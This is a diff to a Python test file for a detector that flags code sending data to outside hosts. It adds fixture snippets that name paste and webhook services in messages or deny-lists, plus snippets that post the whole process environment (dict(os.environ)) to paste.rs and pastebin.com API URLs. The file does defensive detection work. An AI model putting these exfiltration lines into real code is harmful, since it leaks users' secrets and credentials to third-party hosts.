@@ -117,8 +117,24 @@ class TestADestinationOnlyNamed:
             "def check(url):\n"
             '    raise ValueError("send the report to https://discord.com/api/webhooks/1/x")\n',
             'def help():\n    print("paste your output at https://paste.rs")\n',
+            'HELP = "paste your output at https://paste.rs"\ndef help():\n    print(HELP)\n',
+            'DENY = ("pastebin.com",)\n'
+            "def allowed(host):\n"
+            "    for d in DENY:\n"
+            "        if d in host:\n"
+            "            return False\n"
+            "    return True\n",
+            'DENY = ("pastebin.com",)\n'
+            "def allowed(host):\n    return not any(d in host for d in DENY)\n",
         ],
-        ids=["a deny-list", "an exception message", "a printed message"],
+        ids=[
+            "a deny-list",
+            "an exception message",
+            "a printed message",
+            "a printed name",
+            "a deny-list looped over",
+            "a deny-list in a comprehension",
+        ],
     )
     def test_a_host_that_is_a_message_or_a_deny_list_is_quiet(self, tmp_path, named) -> None:
         assert not Kit.fires(tmp_path, self.LOOT + named)
@@ -141,8 +157,27 @@ class TestADestinationOnlyNamed:
             '    url = "https://discord.com/api/webhooks/1/x"\n'
             "    def go(self):\n"
             "        requests.post(self.url, data=dict(os.environ))\n",
+            "import requests\n"
+            'HELP = "https://paste.rs/api"\n'
+            "print(HELP)\n"
+            "requests.post(HELP, data=dict(os.environ))\n",
+            "import requests\n"
+            'DENY = ("https://pastebin.com/api",)\n'
+            "for d in DENY:\n    target = d\n    requests.post(target, data=dict(os.environ))\n",
+            "import requests\n"
+            'DENY = ("https://pastebin.com/api",)\n'
+            "def allowed(host):\n    return not any(d in host for d in DENY)\n"
+            "requests.post(DENY[0], data=dict(os.environ))\n",
         ],
-        ids=["a constant", "a dict item", "an iterated list", "a class attribute"],
+        ids=[
+            "a constant",
+            "a dict item",
+            "an iterated list",
+            "a class attribute",
+            "a name printed and sent",
+            "a loop variable passed on",
+            "a deny-list that is also indexed and sent",
+        ],
     )
     def test_a_host_that_reaches_a_request_or_is_not_resolved_fires(self, tmp_path, sent) -> None:
         assert Kit.fires(tmp_path, self.LOOT + sent)
